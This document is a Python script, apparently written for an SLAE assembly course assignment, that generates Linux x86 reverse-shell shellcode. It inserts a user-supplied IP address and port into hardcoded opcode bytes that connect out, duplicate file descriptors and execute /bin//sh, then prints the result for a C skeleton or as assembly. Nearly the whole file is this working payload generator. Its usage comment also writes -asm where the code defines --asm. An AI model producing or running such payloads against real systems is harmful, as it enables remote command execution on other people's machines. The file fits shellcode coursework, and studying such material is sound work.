#!/usr/bin/python3.5
# Student ID:SLAE-860
# Assignment 3
# Usage: ./shconfig3.py -p <port number> -i <ip address> (-asm if embedding bytes in assembly code)
# Copy shellcode output to shellcode.c skeleton, compile and run.

import argparse
from struct import pack

begin = r"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x97\x6a\x66\x58\x6a\x02\x5b\x31" \
        r"\xc9\x51\x66\x68\x1b\x61\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x03\x68"

begin_asm = r"0x6a,0x66,0x58,0x6a,0x01,0x5b,0x31,0xf6,0x56,0x53,0x6a,0x02,0x89,0xe1,0xcd,0x80,0x31,0xff,0x97,0x6a," \
            r"0x66,0x58,0x6a,0x02,0x5b,0x31,0xc9,0x51,0x66,0x68,0x1b,0x61,0x66,0x53,0x89,0xe1,0x6a,0x10,0x51,0x57," \
            r"0x89,0xe1,0xcd,0x80,0xb0,0x66,0xb3,0x03,0x68,"

port = r"\x66\x68"

port_asm = r"0x66,0x68,"

end = r"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x57\x5b\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0" \
      r"\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"

end_asm = r"0x66,0x6a,0x02,0x89,0xe1,0x6a,0x10,0x51,0x57,0x89,0xe1,0xcd,0x80,0x57,0x5b,0x31,0xc9,0xb1,0x02,0xb0,0x3f," \
          r"0xcd,0x80,0x49,0x79,0xf9,0xb0,0x0b,0x31,0xc9,0x51,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89," \
          r"0xe3,0x31,0xc9,0x31,0xd2,0xcd,0x80"

parser = argparse.ArgumentParser()
parser.add_argument('-p', action="store", dest="p", type=int)
parser.add_argument('-i', action="store", dest="i")
parser.add_argument('--asm', action="store_true", dest="asm")
args = parser.parse_args()

if 1024 < args.p < 65536:
        unformatted_port = r''.join(hex(b)[2:4] for b in pack('!i', args.p))
        if args.asm is True:
            delim = r'0x'
            port += delim + unformatted_port[2:4] + r',' + delim + unformatted_port[4:8] + r','
        else:
            delim = r'\x'
            port += delim + unformatted_port[2:4] + delim + unformatted_port[4:8]

else:
        print('Port must be between 1025 and 65535.  Exiting.')
        exit(0)

dot1_pos = args.i.find('.')
dot2_pos = args.i.find('.', dot1_pos + 1)
dot3_pos = args.i.find('.', dot2_pos + 1)
octets = []

octets.append(int(args.i[0:dot1_pos]))
octets.append(int(args.i[dot1_pos + 1:dot2_pos]))
octets.append(int(args.i[dot2_pos + 1:dot3_pos]))
octets.append(int(args.i[dot3_pos + 1:len(args.i)]))
ip = r''

if args.asm is True:
    for octet in octets:
        if 1 <= octet <= 255:
            ip += r'0x'
            ip += '{0:02x},'.format(octet)
        else:
            print("Valid octets are between 1 and 255.  Try again.")
            exit(0)
    shellcode = r'db ' + begin_asm + ip + port_asm + end_asm
    print("Shellcode :  " + shellcode)
else:
    for octet in octets:
        if 1 <= octet <= 255:
            ip += r'\x'
            ip += '{0:02x}'.format(octet)
        else:
            print("Valid octets are between 1 and 255.  Try again.")
            exit(0)

    shellcode = begin + ip + port + end
    print("Shellcode :  " + "\"" + shellcode + "\";")
